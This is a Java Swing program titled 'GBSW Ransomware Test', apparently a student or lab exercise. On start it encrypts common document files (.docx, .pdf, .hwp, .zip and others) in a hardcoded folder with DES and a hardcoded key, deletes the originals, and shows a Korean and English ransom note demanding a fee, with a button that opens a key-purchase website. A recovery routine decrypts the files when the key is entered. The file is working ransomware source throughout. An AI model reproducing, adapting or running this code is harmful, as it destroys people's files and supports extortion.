import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.lang.reflect.Field;
import java.io.FilenameFilter;
import java.util.Scanner;
import java.util.List;
import java.nio.file.*;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.awt.Desktop;
import java.net.URI;
import java.net.URISyntaxException;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class MainWithGUI extends JFrame {

    private static final long serialVersionUID = 1L;
    public static String CodeKey = "20060912";
    public static String basedir = "C:\\Users\\dongy\\Desktop\\test\\";
    private JTextArea consoleTextArea;
    private JTextField keyTextField;

    public MainWithGUI() throws InvalidKeyException, NoSuchAlgorithmException, IOException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException {
        initializeUI();
    }

    private void initializeUI() {
        setTitle("GBSW Ransomware Test");
        setSize(600, 600);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        JPanel panel = new JPanel();
        panel.setLayout(new GridLayout(2, 1));

        JPanel buttonPanel1 = new JPanel();
        buttonPanel1.setLayout(new FlowLayout());
        JButton recoverButton = new JButton("파일 복구");
        recoverButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String code = JOptionPane.showInputDialog("복호화키를 입력하세요:");
                if (code == null) {
                    return;
                }

                consoleTextArea.append("Input Key: " + code + "\n");

                if ("exit".equals(code)) {
                    System.exit(0);
                } else {
                    if (code.equals(CodeKey)) {
                        consoleTextArea.append("Working......\n\n");
                        File file = new File(basedir);
                        consoleTextArea.append(file + "\n");
                        File[] files = file.listFiles(new FilenameFilter() {
                            @Override
                            public boolean accept(File dir, String name) {
                                consoleTextArea.append(name + "\n");
                                return name.toLowerCase().endsWith(".encrypt");
                            }
                        });
                        for (File f : files) {
                            consoleTextArea.append(f.getName() + "\n\n");
                            try {
                                Decrypt(basedir + f.getName());
                                f.delete();
                                consoleTextArea.append("유효한 복구키가 입력되었습니다!\n");
                                consoleTextArea.append("복호화 완료!\n\n");
                            } catch (Exception ex) {
                                consoleTextArea.append("Error.. Because Sungmin... : " + ex.getMessage() + "\n");
                            }
                        }
                    } else {
                        consoleTextArea.append("잘못된 복구키!!!!\n");
                    }
                }
            }
        });
        buttonPanel1.add(recoverButton);

        JPanel buttonPanel2 = new JPanel();
        buttonPanel2.setLayout(new FlowLayout());
        JButton purchaseKeyButton = new JButton("복호화 키 구매");
        purchaseKeyButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                try {
                    Desktop.getDesktop().browse(new URI("https://kairos-hk.github.io/jran_website/index.html"));
                } catch (IOException | URISyntaxException ex) {
                    ex.printStackTrace();
                }
            }
        });
        buttonPanel2.add(purchaseKeyButton);

        consoleTextArea = new JTextArea();
        consoleTextArea.setEditable(false);
        JScrollPane scrollPane = new JScrollPane(consoleTextArea);

        keyTextField = new JTextField();

        panel.add(buttonPanel1);
        panel.add(buttonPanel2);

        add(scrollPane, BorderLayout.CENTER);
        add(keyTextField, BorderLayout.PAGE_END);
        add(panel, BorderLayout.PAGE_END);

        setVisible(true);

        consoleTextArea.append("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n\n");
        consoleTextArea.append("   ⠀⠀⠀⠀⣀⠤⠔⠒⠒⠒⠒⠒⠒⠒⠦⢄⣀⠀⠀⠀⠀\n"
                + "   ⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢄⠀⠀                                                 < !! 경고 !! >\n"
                + "   ⢀⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢣  _                 귀하의 컴퓨터 내 모든 파일이 암호화 되었습니다!\n"
                + "   ⢸⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢢⠈⡇      \n"
                + "   ⢸⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⡇                         만약 귀하의 파일을 복구하고자 한다면,\n"
                + "   ⠘⡆⢸⠀⢀⣀⣤⣄⡀⠀⠀⠀⢀⣤⣤⣄⡀⠀⡇⡸⠀                   필수적으로 복구키를 구매하셔야 합니다!\n"
                + "   ⠀⠘⣾⠀⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⠀⡗⠁⠀     \n"
                + "   ⠀⠀⣿⠀⠙⢿⣿⠿⠃⢠⢠⡀⠙⠿⣿⠿⠃⠀⡇⠀⠀    \n"
                + "   ⠀⠀⠘⣄⡀⠀⠀⠀⢠⣿⢸⣿⠀⠀⠀⠀⠀⣠⠇⠀⠀     \n"
                + "   ⠀⠀⠀⠀⡏⢷⡄⠀⠘⠟⠈⠿⠁⠀⢠⡞⡹⠁⠀    \n"
                + "   ⠀⠀⠀⠀⢹⠸⠘⢢⢠⠤⠤⡤⡄⢰⢡⠁⡇     \n"
                + "   ⠀⠀⠀⠀⢸⠀⠣⣹⢸⠒⠒⡗⡇⣩⠌⢀⡇⠀     \n"
                + "   ⠀⠀⠀⠀⠈⢧⡀⠀⠉⠉⠉⠉⠁⠀⣀⠜⠀⠀     \n"
                + "   ⠀⠀⠀⠀⠀⠀⠉⠓⠢⠤⠤⠤⠔⠊⠁⠀     \n");
        consoleTextArea.append("\n");
        consoleTextArea.append("  Your files have all been encrypted using a heavy encryption called \"DES\".\n");
        consoleTextArea.append("  당신의 PC내 파일들은 매우 강력한 암호로 불리는 \"DES\"으로 암호화되어 있습니다.\n");
        consoleTextArea.append("  You will not be able to access the files unless you have been provided the PASSCODE.\n");
        consoleTextArea.append("  당신에게는 복호화키를 이용하는 방법 이외에는 해당 파일을 복구할 수 있는 방법이 없습니다.\n");
        consoleTextArea.append("  This unfortunate event does have a solution. By paying a small fee.\n");
        consoleTextArea.append("  소정의 요금을 지불하는 방법으로, 이 불행한 상황에서 벗어날 기회가 있습니다.\n\n");
        consoleTextArea.append("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n\n");
    }

    public static void main(String[] args) throws NoSuchAlgorithmException, IOException, FileNotFoundException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException, InvalidKeyException {
        SwingUtilities.invokeLater(() -> {
            try {
                new MainWithGUI();
            } catch (InvalidKeyException | NoSuchAlgorithmException | IllegalBlockSizeException | BadPaddingException | NoSuchPaddingException | IOException e) {
                e.printStackTrace();
            }
        });


        new Thread(() -> {
            try {
                FireUP();
            } catch (NoSuchAlgorithmException | IOException | IllegalBlockSizeException | BadPaddingException | NoSuchPaddingException | InvalidKeyException e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static void FireUP() throws NoSuchAlgorithmException, IOException, FileNotFoundException, IllegalBlockSizeException, BadPaddingException, InvalidKeyException, NoSuchPaddingException {
        File file = new File(basedir);

        File[] files = file.listFiles(new FilenameFilter() {

            public boolean accept(File dir, String name) {

                if (name.toLowerCase().endsWith(".txt") || name.toLowerCase().endsWith(".pptx") || name.toLowerCase().endsWith(".hwp") || name.toLowerCase().endsWith(".docx") || name.toLowerCase().endsWith(".doc") || name.toLowerCase().endsWith(".zip")
                        || name.toLowerCase().endsWith(".pdf") || name.toLowerCase().endsWith(".ppt")) {
                    return true;
                } else {
                    return false;
                }
            }

        });
        for (File f : files) {
            System.out.println(f.getName());

            Encrypt(basedir + f.getName());
        }
    }

    public static void Encrypt(String targetFilePath) throws NoSuchAlgorithmException, IOException, FileNotFoundException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException, InvalidKeyException{
        File inputFile = new File(targetFilePath);
       
        File encryptedFile= new File(targetFilePath+".encrypt");

        
        try{
            CrypTool.encrypt(CodeKey,inputFile,encryptedFile);
            System.out.println(inputFile+" is encrypted now!");
            inputFile.delete();
        }
        
    catch(CryptoException ex){
    System.out.println(ex.getMessage());
    ex.printStackTrace();
}
    }
    
    public static void Decrypt(String targetFilePath) throws NoSuchAlgorithmException, IOException, FileNotFoundException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException, InvalidKeyException{
        File inputFile = new File(targetFilePath);
        File decryptedFile= new File(targetFilePath+".decrypt");
        try{
            CrypTool.decrypt(CodeKey,inputFile,decryptedFile);
            System.out.println(inputFile+" is decrypted now!");
            
        }
    
    catch(CryptoException ex){
    System.out.println(ex.getMessage());
    ex.printStackTrace();
}



}

        
}
